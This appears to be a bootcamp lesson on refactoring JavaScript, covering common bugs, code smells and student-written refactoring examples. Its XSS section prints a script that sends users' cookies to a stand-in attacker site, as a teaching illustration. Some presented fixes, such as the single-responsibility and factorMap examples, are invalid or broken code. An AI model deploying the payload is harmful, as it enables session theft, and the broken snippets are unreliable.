---
layout: page
title: Refactor Tractor
subheading: Game Time and Ideabox
length: 90
tags: javascript, refactoring, jquery
---
# Refactor Tractor: The JS Edition

## Learning Goals
* Understanding the general goal of refactoring
* Red, Green, Refactor Workflow
* Become familiar with common mistakes and avoid bad practices in JavaScript code

## Warmup
__What Is Refactoring and Why Do It?__

"Refactoring is the process of changing a software system in such a way that it does not alter the external behavior of the code yet improves its internal structure."
-- Martin Fowler from [Refactoring: Improving The Design of Existing Code](http://www.amazon.com/Refactoring-Improving-Design-Existing-Code/dp/0201485672/ref=sr_1_1?ie=UTF8&qid=1452175241&sr=8-1&keywords=refactoring+improving)

- Makes code clearer and easier to work on

- Typically done in small steps

Refactoring is not exactly 'bug fixing', not exactly 'just rearranging code' and almost never 'adding features'.

![refactoring](http://i.imgur.com/oqKzbq1.jpg)

For that reason, even though this lesson is called 'Refactor Tractor' not everything in it is exactly refactoring. We will be covering learning to recognize common subtle bugs and code smells in JavaScript code. We will also be covering how to fix those bugs and communicating your fixes through Github.

__Take a few minutes and reflect on the following questions:__
* What percentage of your time coding do you feel like you spend 'refactoring' what you've written?
* Books, articles or talks that help understanding writing cleaner code?
* What would the difference be between 'refactoring' and 'reworking'?

## Red, Green, Refactor
  'Red > Green > Refactor' is a short term used to explain the typical TDD work flow. The idea is that, when you're test driving software development, you go through the following steps:

  Red: Think of something you want your code to do and write a test that will fail unless the code is functioning.

  Green: Write just enough code to make the test that you wrote earlier pass.

  Refactor: Now that the code works, you focus on cleaning it up. Eliminate duplication, improve the code quality.

  And repeat.

  If you've ever sat in front of a blank piece of paper trying to write a letter, report, poem, etc - you probably know that if you focus too hard of writing something beautiful and perfect on the first shot, the task is daunting and exhausting. However, if you allow yourself the freedom to write a second draft and go back and edit, you can feel freer to just get your thoughts out on the first pass.

  Refactoring is a lot like that, only instead of waiting for the very end to write another draft, you clean up after every paragraph or stanza.

  Regardless of whether or not a developer is working in a strictly 'Test Driven' way, red green refactor is an incredible useful thing to keep in mind.

  Many times when we are learning to program--either in general or just in a new language or style that we're unfamiliar with--we tend to make broad sweeping changes to the code we've written or get stuck worrying that we're not writing things correctly.

  Or we copy pasta a huge chunk of code from an example and try to make it work.

  Either way, the best way to not get overwhelmed is to follow the spirit of `red > green > refactor`.
  - Define what you want the code to do
  - Get the code to do what you want it to do in a measurable way (could be a test, could be manually testing) without fear of writing embarrassing code
  - Clean up the code that is working

  In a less eloquent quote than the one provided by Martin Fowler, 'you can't polish a turd if you don't first have the turd'.

## Low Hanging Refactoring Fruit

__aka The 'Oops I Left That In There' Code__

#### `debugger` statements
```js
  debugger;
```

I mean, first of all, that's a big security issue... second of all, that's just lazy.

#### Commented out code.
```js
  //#.bind(this);
```
 Sometimes an argument for commented out code can be made when it's there as a reminder or note to other developers. Sometimes. The above example is most likely unintentionally committed, however.

#### Wonky Whitespace
  Developers scan code - and mismatching or messed up whitespace is the equivalent of seeing someone with a misspelled tattoo. Doesn't matter how good the code is, it just looks odd.

#### Mismatched or Too Many Semicolons Used

```js
//...
success: function(idea){
  removeIdeaFromView(idea)
},
error: function(){
  console.log("fail");
}
```

JS does not enforce the use of semicolons, so it's possible to omit them. BUT when they are missing, the JavaScript parser automatically inserts them.

_This can change how your code behaves_

Check out this example from the [JavaScript Garden](http://bonsaiden.github.io/JavaScript-Garden/#core.semicolon)

```js
(function(window, undefined) {
    function test(options) {
        log('testing!')

        (options.list || []).forEach(function(i) {

        })

        options.value.test(
            'long string to pass here',
            'and another long string to pass'
        )

        return
        {
            foo: function() {}
        }
    }
    window.test = test

})(window)

(function(window) {
    window.someLibrary = {}

})(window)
```

This is how the interpreter will parse the code - which will change what the code does.

```js
(function(window, undefined) {
    function test(options) {

        // Not inserted, lines got merged
        log('testing!')(options.list || []).forEach(function(i) {

        }); // <- inserted

        options.value.test(
            'long string to pass here',
            'and another long string to pass'
        ); // <- inserted

        return; // <- inserted, breaks the return statement
        { // treated as a block

            // a label and a single expression statement
            foo: function() {}
        }; // <- inserted
    }
    window.test = test; // <- inserted

// The lines got merged again
})(window)(function(window) {
    window.someLibrary = {}; // <- inserted

})(window); //<- inserted
```

#### Accidental Global Variables

Forgetting a `var` or `let`/`const` can cause major problems in your code.

To review:

```js
var cat = 'fluffy';
// This defines a `cat` in the current scope

snake = 'snek';
// This defines a variable called `snake` in the global scope
```

This can cause some pretty gnarly bugs. [Try running the code below on jsbin](http://jsbin.com/fukuqupalo/edit?js,console).

```js
for(var i = 0; i < 5; i++) {
  console.log(i);
  methodThatAccidentlyCreatesAGlobalVariable();
  console.log(i);
}

function methodThatAccidentlyCreatesAGlobalVariable(){
  for(i = 0; i < 5; i++) { // welp, we forgot the var statement
    // ...
  }
}
```

The `methodThatAccidentlyCreatesAGlobalVariable()` creates a global `i` variable. The initial `for` loop will only run once.

__Reflect__
* What do you use to review code before you commit it?
* What do you use to catch these basic issues?

## More Complex JavaScript Code Issues to Look Out For

#### Uncached jQuery Selectors

```js
  $("#myHeader").hide();
  // do some things
  $("#myHeader").show();
```

In the above code, jQuery is searching the entire DOM tree to locate the `#myHeader` twice.

Instead, we should consider caching - storing the reference to the object in a variable.

```js
  var $myHeader = $(“#myHeader”);

  $myHeader.hide();
  // do some things
  $myHeader.show();
```

#### Cross-Site Scripting (XSS) Attack Vulnerability
Cross-site Scripting is when malicious scripts are inserted into the client-side code of a web site or application. You are vulnerable to this kind of attack when you use unvalidated or unencoded user input directly in your site.

Let's say an attacker wants to steal your users' cookies (I can't believe that's a real sentence in web development, but anyway... let's assume)

You could do something like that with this line of code:

```
<script>
  window.location='http://mysweethackingwebsite98736902/?cookie='+document.cookie
</script>
```

Now let's say that in your Blogger app, you take the contents of what someone types in a comment field - store it in the database - and then show it on a page.

Boom. Hacked.

Another example is - maybe you have a store online. Maybe you're selling very expensive t-shirts. Maybe you pull in information like price from the database.

Maybe you then run a sale that takes 10% off of the price and you do your calculation in JavaScript and then change the price on the page.

Maybe then, since you did the calculation in JavaScript, you rely on pulling in the t-shirt's price from the DOM when someone purchases it.

What could go wrong?

__Reflect__
* Did any of the above examples surprise you?
* How often do you think developers make these kinds of 'mistakes' in production code?
* How, other than memorizing flash cards, can you prevent potential bugs that you don't know are possible?

## Student Added Content

#### Breaking the Law of Demeter

No, not [this Demeter](https://en.wikipedia.org/wiki/Demeter). (Though she is the center of one of the more interesting season myths).

The Law of Demeter (LoD) is also known as the **principle of least knowledge**, which is a fancy way of saying each piece of code should be stupid. Here are some critical points:

* Units of code should have limited knowledge of other code.
* Stranger Danger: Code should only talk to code it knows.

LoD is a critical philosophy of object-oriented programming (OOP) and requires objects to request something from another object or instance rather than accessing it directly.

Object methods can invoke the methods of 5 types of objects:

1. The object itself.
2. The method's parameters.
3. Objects instantiated within the method.
4. The Object's direct components.
5. Global variables within scope.

**Example of LoD Code Smell**
```
class Invoice < ActiveRecord::Base
  belongs_to :user
end

<%= @invoice.user.name %>
<%= @invoice.user.address %>
<%= @invoice.user.cellphone %>
```

**Example of Refactored Code**
```
class Invoice < ActiveRecord::Base
  belongs_to :user
  delegate :name, :address, :cellphone, :to => :user, :prefix => true
end

<%= @invoice.user_name %>
<%= @invoice.user_address %>
<%= @invoice.user_cellphone %>
```

#### Callback Hell

Async Javascript requires the use of Callbacks. Imagine a series of events A, B and C. If C relies on B and B relies on A, this can get problematic. Imagine the following async snippet with conditionals:

```
doAsync1(function () {
  doAsync2(function () {
    doAsync3(function () {
      doAsync4(function () {
    })
  })
})

```

Ways to avoid and re-factor Callback Hell:
* `Modular approach` includes breaking each task into seperate functions. Instead of sprinkling anonymous functions everywhere, you can have specific functions that are re-useable. Imagine the following:

```
function onProcess3(err, data) {
  if (err) return res.status(500).send(err)
  fs.writeFile(outputFile, data, onWriteFile)
}
```

* `Promises approach` includes using methods such as `.then`, `.catch` and other error
  handling approachs.
* `ES6 generators` includes a "Pause and Execute" approach. It is definitely worth reading the blog [here](https://medium.com/@adamkijensen/til-es6-generators-39196f7f5283#.3xf1s11bu)
* Use an external library such as [highland.js](http://highlandjs.org/) or [async](https://github.com/caolan/async)

#### Single Responsibility Principle && Code That Does Too Much

A class or module should only have one reason to change.

Anything that gives a class a reason to change should be considered a responsibility.

````md
* Persistence
* Validation
* Notification
* Error Handling
* Class Selection / Instantiation
* Formatting
* Parsing
* Mapping
````

Code that does too much, where logic isn’t contained, can cause unintended side effects.

It's better to separate responsibilities so the codebase is resilient to change and easy to understand. In a sense, future-proof.

Example:

````js
function IncomeStatement() {
	let transactions = transactions
}

IncomeStatement.prototype.process_transactions() {
  for transaction in transactions {
    this.calc_revenue(transaction)
  }
}

IncomeStatement.prototype.calc_revenue(transaction) {
	transaction.sale_price - transaction.cost_of_goods;
}
````

If we change how revenue is calculated for certain transactions, by including other fixed or variable costs, the income statement class will have to change.

Refactored:

````js
function IncomeStatement() {
	let transactions = transactions
}

IncomeStatement.prototype.process_transactions() {
  for transaction in transactions {
    Revenue.calc_revenue(transaction)
  }
};

function Revenue() {
  let gross_profit = gross_profit
}

Revenue.prototype.calc_revenue(transaction) {
	gross_profit = transaction.sale_price - transaction.cost_of_goods
}
````

Now the calculation of revenue is independent of the larger income statement and can adapt to transaction specific costs.

#### If If If Else If Else Else If Else ...

Deeply nested if/else statements should be avoided-- they make a program difficult to follow. There are many ways to refactor/restructure to avoid this condition, and good strategy can vary with the situation.

#### Breaking Up Functions

Instead of:

```js
if (input.indexOf("red" > -1)) {
  if (input.indexOf("boat" > -1)) {
    // Do the thing for red boats
  } else (input.indexOf("train" > -1)) {
    // Do the thing for red trains
  }
} else (input.indexOf("blue" > -1)) {
  // more if elses
}
```

You could:

```js
var deviceActions = {
  train : function(color) {
    // Do something for trains based on color
  },
  boat : function(color) {
    // Do something for boats based on color
  }
}

inputWords = input.split();
deviceActions[inputWords[0]](inputWords[1])
```

#### Use an object (aka hash aka dictionary)

This was used somewhat in the previous example, but let's take a look at the classic fizzbuzz, or as exercism.io implements it, [raindrops](http://exercism.io/exercises/javascript/raindrops/readme). The gist of the problem is to output different words based on whether an integer is divisible by 3, 5, 7, or any combination thereof.

One method would be out-of-control if/elses something like:

```js
  if(n % 3 === 0) {
    if(n % 5 === 0) {
      if(n % 7 === 0) {
        return "plingplangplong";
      }
    } else if (n % 7 === 0) {
      return "plingplong";
    } else {
      return "pling"
    }
  } // much more code ...
```

Have you written a raindrops/fizzbuzz solution that looked like this? No judgement! Most people in the world do not have the patience, logical aptitude, or what have you, to sit down and make something like this work. So give yourself a nice back pat.

Another way to do this would be to see that we could just check once for each factor, appending to a result string:

```js
  var result = "";

  if(n % 3 === 0) {
    result += "pling";
  }
  if(n % 5 === 0) {
    result += "plang";
  }
  if(n % 7 === 0) {
    result += "plong";
  }
  return result;
```

Not looking too bad. Sometimes it's about taking a step back and thinking about what really needs to be done instead of getting right into the if/else weeds. Or, you can shamelessly write the if/elses to get the job done, then take a look at it and see if there are any patterns that could make the code cleaner.

For this example, the three isolated `if`s with the trick of appending a single result might be a good stopping place. But sometimes it's more complex, which is where the hash pairs come in:

```js
  var result = "";
  var factors = Object.keys(factorMap);

  for(var i = 0; i < factors.length; i++) {
    var factor = parseInt(factors[i]);
    if (n % factor === 0) {
      result = result.concat(factorMap[factor]);
    }
  }

  var factorMap = {
    3 : "Pling",
    5 : "Plang",
    7 : "Plong"
  };
```
So now a dozen-ish if statements are down to one. Is this the best solution for this problem? Maybe not. But the hash method can be a useful refactoring tool.

#### Recursion

Sometimes a hopelessly complex `if/else` branching sequence can be solved with some light recursion. Think about the [binary search tree](https://en.wikipedia.org/wiki/Binary_search_tree). To do an in-order traversal of a tree, you could use an algorithm like the one below. This is bad enough in pseudocode, so let's leave JavaScript out of it for the moment.

```
start at the top of the tree
go left until you can't go left anymore, and carry around an index
  to keep track of how far down you are going
once at the bottom, put that value in your collection array
go right (up) one
is there a node to the right?
  yes: go there
    go left until you can't go left anymore
    ...
  no: add to collection
go right (up) one ...
...
```

It is complex and messy, but it will work. Eventually.

Or you could:

```js
function traverse(start) {
  start = start || root
  if(start === null){ return; }
  return traverse(start.left)
         .concat([start.data])
         .concat(traverse(start.right));
}
```
And that's it.

So, break your if/elses into functions/objects if you can, look for patterns and making the problem easier, and see if recursion can help as well.

#### Passing Too Many Arguments to a Function

We have all been there, you're on the one yard line... that function is almost complete... and then it hits you: You have to pass in ten variables to this ONE FUNCTION. You hit the ground on your knees, throw your hands in the air, and napalm blows up behind you like the classic cover to the hit 1986 drama Platoon. Not anymore. We are here; it's all ok. We will be taking you on a journey through time and space, and also demonsrating solutions to this age-old issue.

We will be going into the most common solution to this problem: putting the variables into an object.

##### Quick and dirty hash

```js
      case "inGame":
          inGame(context, gameSize, game, fireSpeed, fireRate, counter);
          counter++;
          requestAnimationFrame(tick);

          function inGame(context, gameSize, game, fireSpeed, fireRate, counter){
		 game.level.update(game, fireSpeed, fireRate);
		 context.clearRect(0, 0, gameSize.x, gameSize.y);
  		 drawObject(context, game, counter);
		 update(game);
		}
```

becomes

```js
  case "inGame":
     inGame({context: context, gameSize: gameSize, game: game,
        fireSpeed: fireSpeed, fireRate: fireRate, counter: counter});
        counter++;
        requestAnimationFrame(tick);

        function inGame(data){
	  game.level.update(data.game, data.fireSpeed, data.fireRate);
	  context.clearRect(0, 0, data.gameSize.x, data.gameSize.y);
          drawObject(data.context, data.game, data.counter);
          update(data.game);
	}
```
 This can get messy if your variables are too varied.

##### Break objects into more logical components

```js
   let Game = {game: game, gameSize: gameSize}
   let Fire = {fireSpeed: fireSpeed, fireRate: fireRate}

      	case "inGame":
          inGame(context, Game, Fire, counter);
          counter++;
          requestAnimationFrame(tick);

          function inGame(context, Game, Fire, counter){
		 game.level.update(Game.game, Fire.fireSpeed, Fire.fireRate);
		 context.clearRect(0, 0, Game.gameSize.x, Game.gameSize.y);
  		 drawObject(context, Game.game, counter);
		 update(game);
		}
```

While this approach created more arguments, they're more logically broken out.

##### Rethink the structure of your code.
If breaking your arguments into logical objects does not make sense, or there are simply too many arguments
you may want in order to break up the responsiblity of your functions.

```js
      case "inGame":
          inGame(context, gameSize, game, fireSpeed, fireRate, counter);
          inGameUpdateLevel(game, fireSpeed, fireRate);
          inGameClearCxt(gamesize);
          inGameDrawObjt(context, game, counter):
          inGame.update(game);
          counter++;
          requestAnimationFrame(tick);
```

## Your Turn

Your mission now is to spend time refactoring your project.

__A Note on Refactoring__

One of the best things about working as a programmer is working with other programmers. We all make mistakes in our code, from Linus Torvalds to [InfoSec Taylor Swift](https://twitter.com/SwiftOnSecurity?ref_src=twsrc%5Egoogle%7Ctwcamp%5Eserp%7Ctwgr%5Eauthor) to some guy named Fred who just finished a Code School course and added 'software developer' to his LinkedIn profile. It's impossible to know every trick and best practice, and even if you did, you'd still make silly code mistakes in the heat of the moment.

This is why we pair program and have code reviews.

The examples that we pull out in this tutorial are the kinds that every programmer makes. Sometimes it takes a second set of eyes to see where improvements can be made. You'll see them in your code, your classmates' code, your instructors' code, your boss's code... etc.

Never be afraid to make a mistake - that's what you learn from!
